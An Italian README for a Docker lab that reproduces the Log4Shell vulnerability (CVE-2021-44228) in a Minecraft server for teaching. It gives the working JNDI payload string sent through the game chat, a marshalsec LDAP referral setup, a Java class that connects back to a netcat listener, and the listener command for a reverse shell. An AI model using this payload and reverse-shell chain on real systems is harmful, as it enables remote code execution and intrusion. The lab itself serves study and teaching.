# Lab Log4Shell — CVE-2021-44228
> Ambiente didattico per replicare la vulnerabilità Log4Shell attraverso Minecraft per ottenere accesso a una reverse shell

---

## Struttura

```
.
├── docker-compose.yml
├── Dockerfile.ldap          ← build marshalsec da sorgente
└── payload/
    ├── Exploit.java
    ├── Exploit.class        ← da (ri)compilare con Java 8 target
```

---

## Flusso operativo

```
Attacker       mc-server          ldap-attacker       http-attacker
   │                │                    │                    │
   │ ${jndi:ldap://ldap-attacker:1389/Exploit}               │
   │──────────────>│                    │                    │
   │               │ LDAP lookup        │                    │
   │               │──────────────────>│                    │
   │               │                   │ HTTP GET /Exploit.class
   │               │                   │──────────────────>│
   │               │                   │<── Exploit.class ──│
   │               │<── JNDI referral ─│                    │
   │               │ carica + esegue Exploit.class          │
   │               │ → si collega alla connessione netcat   │
```

Il server LDAP (marshalsec LDAPRefServer) **non contiene** la classe
malevola: risponde alla lookup con una **referral** che punta al server
HTTP. È il server HTTP a servire il bytecode `Exploit.class`.

---

## Passi

### 1. Compila Exploit.java (OBBLIGATORIO, target Java 8)
L'exploit apre una connessione verso 172.17.0.1:9001 (Gateway di docker, alla porta che decidiamo noi)

```bash
docker run --rm -v "$(pwd)/payload:/app" amazoncorretto:8 javac /app/Exploit.java
```


### 2. Avvia il lab

```bash
# La prima volta ci vuole tempo: Maven scarica le dipendenze di marshalsec
docker compose up --build
```

Aspetta che vedi nel log di `ldap-attacker`:
```
Listening on 0.0.0.0:1389
```

### 3. Avvia la connessione netcat per la reverse shell
```bash
nc -lvnp 9001
```
- `nc` : netcat
- `-l` : sono in ascolto
- `-v` : verbose
- `-n` : non risolvere il DNS, usa solo host numerici
- `-p` : ti passo la porta

### 4. Connettiti al server Minecraft

- **IP**: `localhost`  
- **Porta**: `25565`  
- **Versione**: `1.8.8`  
- **Online mode**: disabilitato (puoi usare qualsiasi username)

### 4. Invia il payload dalla chat

```
${jndi:ldap://ldap-attacker:1389/Exploit}
```

> ⚠️ Prisma Launcher gira fuori Docker: usa `localhost` (non `ldap-attacker`).
> Il server Minecraft è **dentro** Docker
> e risolve `ldap-attacker` tramite DNS interno.
> 
> La stringa nella chat viene loggata dal SERVER, che fa la lookup verso
> `ldap-attacker:1389`. Il client (Prisma) non fa nessuna lookup JNDI.

### 5. Verifica
Controlliamo i log e se tutto va bene otterremo il controllo della macchina

```bash
# Log del server LDAP (deve mostrare la connessione in arrivo)
docker logs ldap-attacker

# Log del server HTTP (deve mostrare il GET /Exploit.class)
docker logs http-attacker

# Verifica della reverse shell (deve mostrare "minecraft")
whoami
```

---

## Spiegare la Kill Chain

1. **Delivery** → Il Client Attaccante scrive `${jndi:ldap://...}` nella chat  
2. **Exploit** → `mc-server` logga il messaggio con Log4j 2.x; Log4j risolve la JNDI expression invece di scrivere testo  
3. **Callback** → `ldap-attacker` riceve la lookup e risponde con una referral verso `http-attacker:8888/Exploit.class`  
4. **Payload** → La JVM del server scarica e carica `Exploit.class`, lo script viene eseguito  
5. **Impact** → Reverse shell ottenuta
